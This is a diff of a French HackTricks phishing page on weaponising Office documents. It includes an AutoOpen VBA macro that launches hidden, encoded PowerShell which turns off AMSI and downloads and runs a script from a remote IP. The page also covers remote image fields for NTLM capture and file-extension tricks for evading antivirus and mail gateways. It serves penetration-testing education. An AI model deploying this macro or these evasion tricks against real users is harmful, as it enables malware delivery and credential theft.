@@ -8,11 +8,11 @@
 * Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PRs au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Partagez vos astuces de piratage en soumettant des PRs au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## Documents Office
+## Documents de Bureau
 
 Microsoft Word effectue une validation des données de fichier avant d'ouvrir un fichier. La validation des données est effectuée sous forme d'identification de la structure des données, conformément à la norme OfficeOpenXML. Si une erreur se produit lors de l'identification de la structure des données, le fichier analysé ne sera pas ouvert.
 
@@ -24,27 +24,25 @@ Vous pouvez utiliser la commande suivante pour vérifier quelles extensions vont
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-Les fichiers DOCX faisant référence à un modèle distant (Fichier - Options - Compléments - Gérer : Modèles - Exécuter) qui inclut des macros peuvent également "exécuter" des macros.
-
 ### Chargement d'image externe
 
 Aller à : _Insérer --> Parties rapides --> Champ_\
 _**Catégories**: Liens et Références, **Noms de champ**: includePicture, et **Nom de fichier ou URL**:_ http://\<ip>/whatever
 
-![](<../../.gitbook/assets/image (152).png>)
+![](<../../.gitbook/assets/image (155).png>)
 
-### Porte dérobée des macros
+### Porte dérobée Macros
 
 Il est possible d'utiliser des macros pour exécuter du code arbitraire à partir du document.
 
-#### Fonctions d'autochargement
+#### Fonctions d'auto-chargement
 
 Plus elles sont courantes, plus il est probable que l'AV les détecte.
 
 * AutoOpen()
 * Document\_Open()
 
-#### Exemples de code des macros
+#### Exemples de code de macros
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -80,8 +78,8 @@ Allez dans **Fichier > Infos > Inspecter le document > Inspecter le document**, 
 
 #### Extension de document
 
-Une fois terminé, sélectionnez **Enregistrer sous type**, changez le format de **`.docx`** en **Word 97-2003 `.doc`**.\
-Faites cela car vous **ne pouvez pas enregistrer de macros à l'intérieur d'un fichier `.docx`** et il y a une **stigmatisation** autour de l'extension **`.docm`** activée par macro (par exemple, l'icône miniature affiche un grand `!` et certains passerelles web/électroniques les bloquent entièrement). Par conséquent, cette **extension `.doc` héritée est le meilleur compromis**.
+Une fois terminé, sélectionnez **Enregistrer sous le type** déroulant, changez le format de **`.docx`** à **Word 97-2003 `.doc`**.\
+Faites cela car vous **ne pouvez pas enregistrer de macros à l'intérieur d'un fichier `.docx`** et il y a une **stigmatisation** autour de l'extension **`.docm`** activée par macro (par exemple, l'icône miniature affiche un grand `!` et certaines passerelles web/électroniques les bloquent entièrement). Par conséquent, cette **extension `.doc` héritée est le meilleur compromis**.
 
 #### Générateurs de macros malveillantes
 
@@ -164,14 +162,14 @@ Il existe plusieurs façons de **forcer l'authentification NTLM "à distance"**,
 
 ### Relais NTLM
 
-N'oubliez pas que vous ne pouvez pas seulement voler le hachage ou l'authentification mais aussi **effectuer des attaques de relais NTLM**:
+N'oubliez pas que vous ne pouvez pas seulement voler le hash ou l'authentification mais aussi **effectuer des attaques de relais NTLM**:
 
 * [**Attaques de relais NTLM**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 * [**AD CS ESC8 (relais NTLM vers certificats)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 * Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
